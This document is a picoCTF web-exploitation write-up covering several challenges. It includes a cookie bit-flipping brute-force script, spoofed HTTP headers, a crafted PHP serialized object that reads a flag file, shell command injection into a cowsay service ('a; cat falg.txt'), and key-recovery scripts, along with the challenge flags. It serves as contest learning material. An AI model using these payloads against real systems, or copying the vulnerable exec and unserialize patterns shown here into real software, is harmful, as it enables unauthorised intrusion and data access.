# Web Exploitation
## More Cookies ![p](https://img.shields.io/badge/Points-90-success) ![c](https://img.shields.io/badge/Web-purple)

As the title says this challenge is about cookies, so by inspecting the given [website](http://mercury.picoctf.net:21553/) we immediately see a cookie named `auth_name` set to `cHhjTUd0S1VpUmFROG1Cell5d3VkWlI4MWxCNHg2ZnhFOFJMb09pY3NoMmpWVEpYRDR1cStsSkJDb2U3VVV3U3Jlb0NVWHpmUkZieXNZOG9kdmE4MXgxa040SjlhSkRWbGxiaEdVZ08yS0R0VjJVMEdlUElDUXYxUTRGZyt0N2U=`, which seems base64 encoded. Let's try to decode it, but we still get nothing readable.  
If we read the challenge description we can see that the cookie is said to be encrypted in some way, we can then guess that it is first encrypted and then base64 encoded.

At this point I was stuck, trying to find a suitable encrypting algorithm without success. Then an hint: _homomorphic encryption_.  
I already faced this type of challenges, so somehow we need to modify the ciphertext in order to become the admin. This leaves only the possibility of a bit-flip attack, meaning that somewhere in the plaintext we have like isAdmin=0 and we need to make it 1.

By doing that, we will make the website decrypt the cookie and consider us as admin. We don't know the position of the bit to change so we need to bruteforce it and send the request to the website that will show us the flag. This is the script I used:
```python
from base64 import b64decode
from base64 import b64encode
import requests

cookie = "cHhjTUd0S1VpUmFROG1Cell5d3VkWlI4MWxCNHg2ZnhFOFJMb09pY3NoMmpWVEpYRDR1cStsSkJDb2U3VVV3U3Jlb0NVWHpmUkZieXNZOG9kdmE4MXgxa040SjlhSkRWbGxiaEdVZ08yS0R0VjJVMEdlUElDUXYxUTRGZyt0N2U="
url = "http://mercury.picoctf.net:21553/"

def flip(index, bit):
    chars = list(decoded_cookie.decode("utf-8"))

    chars[index] = chr(ord(chars[index])^bit)

    new_cookie = ''.join(chars)
    return b64encode(new_cookie.encode("utf-8"))

decoded_cookie = b64decode(cookie)
for i in range(128):
  print(i)
  for j in range(128):
    crafted_cookie = flip(i, j)
    cookies = {'auth_name':crafted_cookie.decode("utf-8")}
    r = requests.get(url, cookies=cookies)
    if "picoCTF{" in r.text:
      print(r.text)
      break
```

Flag: **picoCTF{cO0ki3s_yum_2d20020d}**

## It is my birthdady! ![p](https://img.shields.io/badge/Points-100-success) ![c](https://img.shields.io/badge/Web-purple)

Maybe is me, but the challenge description looks a bit confused. Anyway, what I got from it is that we may need to upload 2 different PDF files with the same MD5 hash. Unfortunately for the birthday boy, MD5 is not the best algorithm when talking about collisions. There are plenty of famous colliding strings and files, like [these](https://www.mscs.dal.ca/~selinger/md5collision/) that, saved as .pdf and uploaded will trigger the website and let us celebrate together.

Flag: **picoCTF{c0ngr4ts_u_r_1nv1t3d_5c8c5ce2}**

## Who are you? ![p](https://img.shields.io/badge/Points-100-success) ![c](https://img.shields.io/badge/Web-purple)

We can access [this](http://mercury.picoctf.net:36622/) website and see what seems to be a trivial User-agent challenge: the kid is telling us _Only people who use the official PicoBrowser are allowed on this site!_ so we can try to modify our `User-agent: picobrowser` in the request to get access. This works, but unfortunately there is more.. Note that I used Burp to craft requests since it was quicker for me, but every other method would work. 

_I don't trust users visiting from another site._ at this point I realized I'm bad with HTTP requests parameters, so it's better to keep [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) open. At some point we can see the Referer parameter (Origin does not work), the address of the previous web page from which a link to the currently requested page was followed. We can now set `Referer: http://mercury.picoctf.net:36622/` and go to the nextstep.

_Sorry, this site only worked in 2018._, trivially set Date to something in 2018 like `Date: Tue, 25 Dec 2018 00:00:00 GMT`.

_I don't trust users who can be tracked._ this one was actually the hardest, due to the fact that DNT (Do Not Track) is deprecated and I didn't think about it. However, just set it to 1 and go on: `DNT: 1`.

_This website is only for people from Sweden._, I tried to set the X-Forwarded-For parameter to a Swedish IP address and... it worked! `X-Forwarded-For: 31.15.32.0`.

_You're in Sweden but you don't speak Swedish?_, this clearly points to the Accept-Language parameter, so set it to Swedish following [this table](http://www.lingoes.net/en/translator/langcode.htm), so `Accept-Language: sv-SE`.

And finally we get the flag! I just want to say that despite being an easy challenge I learned a lot about HTTP requests and parameters, always useful.

The final HTTP request will be something like this:
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:36622
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: sv-SE
Referer: http://mercury.picoctf.net:36622/
Date: Tue, 25 Dec 2018 00:00:00 GMT
DNT:1
X-Forwarded-For: 31.15.32.0
Connection: close
```

Flag: **picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0da16bb2}**

## Some Assembly Required 2 ![p](https://img.shields.io/badge/Points-110-success) ![c](https://img.shields.io/badge/Web-purple)

By inspecting the website source code we can see some Web Assembly, and as done in the part 1 we can go to the last code line and see a string that seems somehow encoded: `xakgK\5cNsl<8?nmi:<i;0j9:;?nm8i=0??:=njn=9u`. This is where [Cyberchef](https://gchq.github.io/CyberChef/) comes in rescue, with the Magic recipe: we can submit an input and it will try to bake everything he can.  
We can see as a result that the performed operation is probably a XOR, even if the flag is a bit compromised: `picoCT=kF{d407fea24a38b1237fe0a587725fbf51}` maybe is because we roughly copied the value from the website.  
We can try to download the source code and see if something changes. `+xakgK\Nsl<8?nmi:<i;0j9:;?nm8i=0??:=njn=9u`, so yes (maybe some encoding stuff messed it up).

Re inserting this into Cyberchef gets us the same XOR operation with '8', leading to the flag: **picoCTF{d407fea24a38b1237fe0a587725fbf51}**

I still don't get how this challenge is considered as a Web and how it's 110 points, but I think it's worth to showcase for this awesome Cyberchef tool.

## Super Serial ![p](https://img.shields.io/badge/Points-130-success) ![c](https://img.shields.io/badge/Web-purple)
> Try to recover the flag stored on this website http://mercury.picoctf.net:42449/

After a classic web recon on this website, the `robots.txt` are interesting: `Disallow: /admin.phps`. Please forgive me, but I didn't know what .phps files were: servers will output a color-formated version of the source code (WOW). So we have access to source codes!

I'm stupid so I tried to access `/admin.phps` directly with no success, until I realized that the index page may be useful: if we access the `index.phps` file we get all the source code we need. Here we can see the first PHP line saying `require_once("cookie.php");`, a reeeeeeaally interesting serialization of a cookie and a redirect `header("Location: authentication.php");`.  
In index, the server creates a permissions object from the provided username and password.

Let's now access `cookie.phps` where I am sure we will see a deserialization of that cookie, here it is:

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

At this point I was a bit stuck, and then I read the hint: _The flag is at ../flag_, so maybe we just need to print things and being admin is not important?  
The interesting thing is that in the previous code, if an error occurs, we will print the perm object.

Let's now take a look to the `authentication.phps` where we can see an `access_log` class, seems a good name to print data:
```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

Ok so maybe we got it, the idea is to create serialized `access_log` object and set its `log_file` to `../flag`, set this as the cookie, then let the website to unserialize this and the trigger the error: at this point the `__toString()` function of `access_log` (instead of the `permission` one) should be called and we should see the flag.

I don't know why I crafted by hand the serialized object but here it is my code:
```php
<?php
    $acc_log = 'O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}';
    echo urlencode(base64_encode($acc_log));
?>
```

printing `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`.  
_Explanation_: `O` means Object, `:10` means the object's name is of 10 chars, `:"access_log"` is the object's name, `:1` is the number of the object's fields. `:{` is the start of the field, `s:8` means the field name is a string of 8 chars, `:"log_file;"` is the field's name, `s:7` means the field value is a string of 7 chars, `:"../flag;"` is the field actual value.  

If we set this value to the `login` cookie and perform a request to the `authentication.php` page we get as a result: `Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}`, as expected.

Flag: **picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}**

## caas ![p](https://img.shields.io/badge/Points-150-success) ![c](https://img.shields.io/badge/Web-purple)

> Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

By accessing the website and submitting some random messages, I started thinking about injecting some malicious content to the request, because the message is just taken and printed back from a cow.  
I tried to inject URL-encoded javascript, a Server Side Template Injection (by using a message like {{7\*7}}), but nothing seemed to work. I then tried to google some other possible attacks but still nothing.

After some time I realized they gave us also a source code I completely ignored:
```javascript
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```

What we can conclude from there is that if we want to do something, the message must make the `exec()` function not to trigger an error, and to print back something useful instead. Also, the fact that `exec` is used may be a good thing for us.

In a command line, multiple commands may be executed sequentially: if we write `cat hello.txt; cat world.txt` is like if we wrote `cat hello.txt` and `cat world.txt` one after the other. What if we can do the same here?

If we try with `a; ls` we will get this:
```
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

BOOM, we just need to send `a; cat falg.txt` and enjoy our points!

Flag: **picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**

# Java Script Kiddie ![p](https://img.shields.io/badge/Points-400-success) ![c](https://img.shields.io/badge/Web-purple)
> The image link appears broken... https://jupiter.challenges.picoctf.org/problem/17205 or http://jupiter.challenges.picoctf.org:17205

If we visit the website we only have one input field and one button, that seem to create an image if we provide some text. Let's now take a look to the Javascript source code and try to understand something: 
```javascript
	var bytes = [];
	$.get("bytes", function(resp) {
		bytes = Array.from(resp.split(" "), x => Number(x));
	});

	function assemble_png(u_in){
		var LEN = 16;
		var key = "0000000000000000";
		var shifter;
		if(u_in.length == LEN){
			key = u_in;
		}
		var result = [];
		for(var i = 0; i < LEN; i++){
			shifter = key.charCodeAt(i) - 48;
			for(var j = 0; j < (bytes.length / LEN); j ++){
				result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
			}
		}
		while(result[result.length-1] == 0){
			result = result.slice(0,result.length-1);
		}
		document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
		return false;
		}
```

The first part makes a request to the /bytes page, and we can see by inspecting the network requests from Chrome that this endpoint sends back, as expected, a bunch of bytes: `87 130 78 188 0 84 26 157 143 239 249 82 248 212 239 82 195 80 1 207 ...` and a lot more (720 in total). The code now creates the `bytes` array by splitting these with space.

The `assemble_png` takes `u_in` as parametes (we can assume being user input, so the input we provide in the text field) and if it's made of 16 characters it replaces the 0 key with it: we can assume now that we will need to find and write the right key.  
In the loop (16 times) we take `key[i] - 48` and another loop is performed (720/16 = 45 times), where we fill `result` (with lenght of 720) array 16 elements after 16 with the "decrypted" bytes. At the end, an image will be displayed using the decrypted bytes as content, in base64. Notice that `key[i] - 48` will turn a digit's ASCII value to the actual digit it represents, in fact the digit 0 has an ASCII value of 48. 

The image is a PNG file, so we can identify the needed bytes by looking at magic bytes and other fixed bytes in the header, so that we can easily reconstruct the first 16 bytes of the image, that is the first loop. `89 50 4E 47 0D 0A 1A 0A` are the magic bytes, and the other chunks are `00 00 00 0D 49 48 44 52`. Now we know these values and we can retrieve the key from the `shifter` variable, with `j = 0`.

This is the Python script I used (it's bad I know):
```python
LEN = 16

f = open("bytes.txt")
bytes = list(map(int, f.read().split(" ")))

known_bytes = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]

keys = ["","","","","","","","","","","","","","","",""]

for i in range (LEN):
	for shifter in range (10):
		if(bytes[(shifter * LEN) % len(bytes) + i] == known_bytes[i]):
			keys[i] += str(shifter)
	
combo = ""
for i in range(LEN):
	if(len(keys[i]) == 1):
		combo += keys[i]
	else:
		combo += "X"
print(combo)
```

This will print a sort of key template `51081803XXX63640`, where the digit are unique and Xs are where we have multiple choices. I must be honest, from now on I tried to verify through Python if they would produce a real image or a corrupted one but I always failed, so I decided to try it manually on the website. I eventually found out the key being `5108180345363640`, producing a QR code that when read gives us the flag.

![image](kiddie1.PNG)

Flag: **picoCTF{066cad9e69c5c7e5d2784185c0feb30b}**

_This is an improved version I made to directly verify and solve (still bad but useful):_
```python
from itertools import product

BYTES_LEN = 720
KEY_LEN = 16

def verify_key(key):
	global bytes_list
	result = [0] * BYTES_LEN

	for i in range(KEY_LEN):
		shifter = int(key[i])

		for j in range(BYTES_LEN // KEY_LEN):
			result[(j * KEY_LEN) + i] = bytes_list[(((j + shifter) * KEY_LEN) % BYTES_LEN) + i]

	with open("./{}.png".format(key), 'wb') as imagefile:
		imagefile.write(bytes(result))


f = open("bytes.txt")
bytes_list = list(map(int, f.read().split(" ")))

known_bytes = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]
keys = []

for i in range (KEY_LEN):
	keys.append([])

for i in range (KEY_LEN):
	for shifter in range (10):
		# here is like j = 0
		if(bytes_list[(shifter * KEY_LEN) % BYTES_LEN + i] == known_bytes[i]):
			keys[i].append(shifter)

for k in product(*keys):
	verify_key(k)
```

With this script we directly create all the possible images, and we can immediately see the right one from the preview: again scan the QR code and the flag is right there!

# Java Script Kiddie 2 ![p](https://img.shields.io/badge/Points-450-success) ![c](https://img.shields.io/badge/Web-purple)

This challenge is very similar to the previous one, the only difference is that the key lenght is 32 instead of 16, but as we can see with this instruction, the "new" inserted values are not relevant. This because they will be part of the key, but never used in "decrypting" the image.

This Python script prints the key template with "a" as the new values, and "X"s as placeholder for the multiple choices we can have for the keys. By manually inserting them I managed to retreive the QR code and then the flag.

```python
BYTES_LEN = 704
KEY_LEN = 16

f = open("bytes.txt")
bytes_list = list(map(int, f.read().split(" ")))

known_bytes = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]
keys = []

for i in range (KEY_LEN):
	keys.append([])

for i in range (KEY_LEN):
	for shifter in range (10):
		# here is like j = 0
		if(bytes_list[(shifter * KEY_LEN) % BYTES_LEN + i] == known_bytes[i]):
			keys[i].append(shifter)
print(keys)
combo=""
for i in range (KEY_LEN):
	if(len(keys[i])==1):
		combo += str(keys[i])[1:2]+"a"
	else:
		combo += "Xa"
print(combo)
```

Flag: **picoCTF{59d5db659865190a07120652e6c77f84}**